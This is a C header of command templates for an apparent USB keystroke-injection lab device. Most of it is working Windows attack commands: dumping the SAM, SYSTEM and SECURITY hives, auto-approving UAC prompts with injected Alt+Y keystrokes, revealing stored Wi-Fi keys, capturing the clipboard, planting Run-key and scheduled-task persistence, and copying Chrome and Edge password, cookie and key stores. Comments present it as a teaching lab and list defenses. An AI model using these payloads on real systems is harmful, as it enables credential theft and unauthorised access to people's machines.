/**
 * =============================================================================
 * lab_commands.h — Lab action command templates ("the .env of this device")
 * =============================================================================
 *
 * Edit the command text HERE, then flash once. No other file needs changing.
 * Leave a command as "" to make that button a no-op (it logs a reminder
 * instead of typing anything).
 *
 * Escaping rules (plain C string):
 *   \"  -> one double quote      \\  -> one backslash
 *   Adjacent "..." pieces are joined automatically, so long commands can be
 *   split across lines for readability.
 * =============================================================================
 */

#ifndef LAB_COMMANDS_H
#define LAB_COMMANDS_H

// --- UAC auto-approval (the HID-on-secure-desktop lesson) --------------------
// 1 = when a lab action runs elevated, the device also sends Alt+Y on the UAC
// secure desktop ~1.5s later. Lesson: input from a *hardware* HID device
// reaches the secure desktop, so the consent prompt is NOT a human gate
// against physical-class attacks. Defenses for the report: USB port/device
// control policy, alerting on unexpected consent.exe / 4688 elevation events,
// physical security of workstations. Set 0 to require a human click again.
#define LAB_UAC_AUTOYES 1

// --- SAMDump: stage 1 opens an elevated prompt (real UAC prompt) ------------
#define LAB_SAMDUMP_ELEVATE_CMD                                                 \
  "powershell -c \"Start-Process cmd -Verb RunAs\""

// --- SAMDump: stage 2 runs inside the elevated prompt -----------------------
#define LAB_SAMDUMP_CMD                                                         \
  "mkdir C:\\LabSAM 2>nul& reg save HKLM\\SAM C:\\LabSAM\\sam /y"               \
  "& reg save HKLM\\SYSTEM C:\\LabSAM\\system /y"                               \
  "& reg save HKLM\\SECURITY C:\\LabSAM\\security /y"                           \
  "& start C:\\LabSAM"

// --- screenshot -------------------------------------------------------------
#define LAB_SCREENSHOT_CMD                                                      \
  "powershell -c \"Add-Type -A System.Windows.Forms,System.Drawing;"            \
  "$s=[Windows.Forms.Screen]::PrimaryScreen.Bounds;"                            \
  "$b=New-Object Drawing.Bitmap $s.Width,$s.Height;"                            \
  "[Drawing.Graphics]::FromImage($b).CopyFromScreen(0,0,0,0,$s.Size);"          \
  "mkdir C:\\LabSS -Force;"                                                     \
  "$p='C:\\LabSS\\ss_'+(Get-Date -Format HHmmss)+'.png';"                       \
  "$b.Save($p);Start-Process $p\""

// --- spare buttons: fill in your own command between the quotes -------------
// All results are saved to C:\LabOut\ and shown in Notepad — nothing leaves
// the machine, no persistence, no real bypass (same lab-safe rules as above).

// BUTTON1 — Clipboard capture (T1115): grabs current clipboard text
#define LAB_BUTTON1_CMD                                                        \
  "powershell -c \"md C:\\LabOut -Force> $null;"                                \
  "Get-Clipboard> C:\\LabOut\\clip.txt;notepad C:\\LabOut\\clip.txt\""

// Bu2 — Wi-Fi profile discovery (T1016/T1003): saved SSIDs + stored keys
// (drop "key=clear" to list SSIDs only)
#define LAB_BU2_CMD                                                            \
  "cmd /c \"mkdir C:\\LabOut 2>nul"                                             \
  "& netsh wlan show profiles key=clear > C:\\LabOut\\wlan.txt"                 \
  "& notepad C:\\LabOut\\wlan.txt\""

// Bu3 — Account & privilege discovery (T1087/T1033)
#define LAB_BU3_CMD                                                            \
  "cmd /c \"mkdir C:\\LabOut 2>nul"                                             \
  "& whoami /all > C:\\LabOut\\who.txt"                                         \
  "& net user >> C:\\LabOut\\who.txt"                                           \
  "& notepad C:\\LabOut\\who.txt\""

// Bu4 — Network connection discovery (T1049)
#define LAB_BU4_CMD                                                            \
  "cmd /c \"mkdir C:\\LabOut 2>nul"                                             \
  "& netstat -ano > C:\\LabOut\\net.txt"                                        \
  "& ipconfig /all >> C:\\LabOut\\net.txt"                                      \
  "& notepad C:\\LabOut\\net.txt\""

// Bu5 — Scheduled task discovery (T1053)
#define LAB_BU5_CMD                                                            \
  "cmd /c \"mkdir C:\\LabOut 2>nul"                                             \
  "& schtasks /query /fo LIST > C:\\LabOut\\tasks.txt"                          \
  "& notepad C:\\LabOut\\tasks.txt\""

// Bu6 — Security posture discovery (T1518.001/T1562.004): Defender + firewall
#define LAB_BU6_CMD                                                            \
  "powershell -c \"md C:\\LabOut -Force> $null;"                                \
  "Get-MpComputerStatus> C:\\LabOut\\def.txt"                                   \
  "; netsh advfirewall show allprofiles>> C:\\LabOut\\def.txt"                  \
  "; notepad C:\\LabOut\\def.txt\""

// --- BONUS: Persistence demo (T1547.001) -------------------------------------
// Stage 1: creates an HKCU Run key "LabPersist" that opens a harmless notepad
// file at next logon. User-level only (no UAC), reversible with:
//   reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LabPersist /f
#define LAB_PERSIST_CMD                                                        \
  "cmd /c \"mkdir C:\\LabOut"                                                   \
  "& echo [PERSIST DEMO] auto-ran from Run key> C:\\LabOut\\pwned.txt"          \
  "& echo notepad C:\\LabOut\\pwned.txt> C:\\LabOut\\p.cmd"                     \
  "& reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"           \
  " /v LabPersist /d C:\\LabOut\\p.cmd /f\""

// Stage 2: shows the new Run key as proof (window stays open)
#define LAB_PERSIST_PROOF_CMD                                                  \
  "cmd /k \"reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"  \
  " /v LabPersist\""

// --- BONUS: Admin persistence demo (T1053.005) -------------------------------
// Same idea as the HKCU demo but as a scheduled task with highest privileges
// (runs for every user at logon). Launched with Ctrl+Shift+Enter — the real
// UAC prompt appears and must be approved by a human, nothing is bypassed.
// Reversible with:
//   schtasks /delete /tn LabPersistTask /f
#define LAB_PERSIST_ADMIN_CMD                                                  \
  "cmd /c \"md C:\\LabOut 2>nul"                                               \
  "& echo [PERSIST DEMO - admin task]> C:\\LabOut\\pwned.txt"                  \
  "& echo notepad C:\\LabOut\\pwned.txt> C:\\LabOut\\p.cmd"                    \
  "& schtasks /create /tn LabPersistTask /tr C:\\LabOut\\p.cmd"                \
  " /sc onlogon /rl highest /f"                                                \
  "& schtasks /query /tn LabPersistTask\""

// Stage 2: shows the new task as proof (window stays open)
#define LAB_PERSIST_ADMIN_PROOF_CMD                                            \
  "cmd /k \"schtasks /query /tn LabPersistTask /v\""

// --- Browser harvest (T1555.003) ---------------------------------------------
// Closes Chrome/Edge (unlocks their SQLite stores), then copies the saved
// password DB (Login Data), cookie DB (Network\Cookies) and Local State
// (holds the AES key wrapped by DPAPI) to C:\LabOut\Browser. Collection
// only — decryption is the offline follow-up lesson. Nothing leaves the VM.
#define LAB_BROWSER_CHROME_CMD                                                 \
  "powershell -c \"taskkill /f /im chrome.exe 2>$null"                          \
  ";taskkill /f /im msedge.exe 2>$null"                                         \
  ";md C:\\LabOut\\Browser -Force>$null"                                        \
  ";$u=$env:LOCALAPPDATA+'\\Google\\Chrome\\User Data'"                         \
  ";copy ($u+'\\Local State') C:\\LabOut\\Browser\\ChromeState -ea 0"           \
  ";copy ($u+'\\Default\\Login Data') C:\\LabOut\\Browser\\ChromeLogin -ea 0"   \
  ";copy ($u+'\\Default\\Network\\Cookies')"                                    \
  " C:\\LabOut\\Browser\\ChromeCookie -ea 0\""

#define LAB_BROWSER_EDGE_CMD                                                   \
  "powershell -c \"$u=$env:LOCALAPPDATA+'\\Microsoft\\Edge\\User Data'"         \
  ";copy ($u+'\\Local State') C:\\LabOut\\Browser\\EdgeState -ea 0"             \
  ";copy ($u+'\\Default\\Login Data') C:\\LabOut\\Browser\\EdgeLogin -ea 0"     \
  ";copy ($u+'\\Default\\Network\\Cookies')"                                    \
  " C:\\LabOut\\Browser\\EdgeCookie -ea 0"                                      \
  ";dir C:\\LabOut\\Browser> C:\\LabOut\\Browser\\files.txt"                    \
  ";notepad C:\\LabOut\\Browser\\files.txt\""

#endif // LAB_COMMANDS_H
